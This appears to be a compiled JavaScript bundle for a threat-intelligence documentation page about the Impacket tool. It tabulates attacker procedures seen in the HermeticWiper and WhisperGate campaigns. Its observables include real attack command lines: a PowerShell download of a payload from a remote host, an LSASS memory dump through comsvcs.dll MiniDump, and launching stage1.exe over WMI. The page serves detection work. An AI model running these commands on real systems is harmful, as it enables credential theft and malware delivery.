"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[5448],{4137:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return u}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var m=r.createContext({}),p=function(e){var t=r.useContext(m),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(m.Provider,{value:t},e.children)},s={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,m=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),d=p(n),u=a,h=d["".concat(m,".").concat(u)]||d[u]||s[u]||i;return n?r.createElement(h,l(l({ref:t},c),{},{components:n})):r.createElement(h,l({ref:t},c))}));function u(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,l=new Array(i);l[0]=d;var o={};for(var m in t)hasOwnProperty.call(t,m)&&(o[m]=t[m]);o.originalType=e,o.mdxType="string"==typeof e?e:a,l[1]=o;for(var p=2;p<i;p++)l[p]=n[p];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},2339:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return m},metadata:function(){return p},toc:function(){return c},default:function(){return d}});var r=n(7462),a=n(3366),i=(n(7294),n(4137)),l=["components"],o={},m=void 0,p={unversionedId:"Weapons/impacket",id:"Weapons/impacket",isDocsHomePage:!1,title:"impacket",description:"Found 3 references across 2 AC3 Threat Sightings. Enjoy!",source:"@site/docs/04-Weapons/impacket.md",sourceDirName:"04-Weapons",slug:"/Weapons/impacket",permalink:"/ac3-threat-sightings/docs/Weapons/impacket",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"iexplore",permalink:"/ac3-threat-sightings/docs/Weapons/iexplore"},next:{title:"installutil",permalink:"/ac3-threat-sightings/docs/Weapons/installutil"}},c=[{value:"From the AC3 Threat Sighting for <em>HermeticWiper</em>",id:"from-the-ac3-threat-sighting-for-hermeticwiper",children:[]},{value:"From the AC3 Threat Sighting for <em>WhisperGate</em>",id:"from-the-ac3-threat-sighting-for-whispergate",children:[]}],s={toc:c};function d(e){var t=e.components,n=(0,a.Z)(e,l);return(0,i.kt)("wrapper",(0,r.Z)({},s,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"Found 3 references across 2 AC3 Threat Sightings. Enjoy!"),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-hermeticwiper"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"HermeticWiper")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_HermeticWiper.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used likely ",(0,i.kt)("em",{parentName:"td"},"WMI")," and ",(0,i.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,i.kt)("em",{parentName:"td"},"CMD")," commands on victim endpoints for Command And Control."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"CMD")," executions with command-line patterns similar to ",(0,i.kt)("em",{parentName:"td"},"Impacket"),"."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1')\\\"> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\\\temp\\\\sys.tmp1 CSIDL_WINDOWS\\\\policydefinitions\\\\postgresql.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\__1636727589.6007507 2>&1"),(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'))),(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"COM+ Service DLL")," to dump ",(0,i.kt)("em",{parentName:"td"},"LSASS")," process memory via ",(0,i.kt)("em",{parentName:"td"},"RunDll32")," and ",(0,i.kt)("em",{parentName:"td"},"PowerShell")," for Credential Access."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"CMD")," executions with ",(0,i.kt)("em",{parentName:"td"},"Impacket")," patterns in command-line."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},'cmd.exe /Q /c powershell -c \\"rundll32 C:\\\\windows\\\\system32\\\\comsvcs.dll MiniDump 600 C:\\\\asm\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\winupd.log full\\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072 2>&1'))))),(0,i.kt)("h2",{id:"from-the-ac3-threat-sighting-for-whispergate"},"From the AC3 Threat Sighting for ",(0,i.kt)("em",{parentName:"h2"},"WhisperGate")),(0,i.kt)("p",null,"Full details at: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_WhisperGate.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_WhisperGate.yml")),(0,i.kt)("table",null,(0,i.kt)("thead",{parentName:"table"},(0,i.kt)("tr",{parentName:"thead"},(0,i.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,i.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,i.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,i.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,i.kt)("tbody",{parentName:"table"},(0,i.kt)("tr",{parentName:"tbody"},(0,i.kt)("td",{parentName:"tr",align:null},"Execution"),(0,i.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,i.kt)("em",{parentName:"td"},"Impacket")," to execute ",(0,i.kt)("em",{parentName:"td"},"Stage1")," ",(0,i.kt)("em",{parentName:"td"},".EXE")," file via WMI and CMD for Execution."),(0,i.kt)("td",{parentName:"tr",align:null},"Windows Command Shell spawned by Windows Management Instrumentation Provider Service (WMIPRVSE)."),(0,i.kt)("td",{parentName:"tr",align:null},(0,i.kt)("em",{parentName:"td"},"Process Created"),": ",(0,i.kt)("br",null),"- ",(0,i.kt)("inlineCode",{parentName:"td"},"cmd.exe /Q /c start c:\\\\stage1.exe 1> \\\\\\\\127.0.0.1\\\\ADMIN$\\__[TIMESTAMP] 2>&1"))))))}d.isMDXComponent=!0}}]);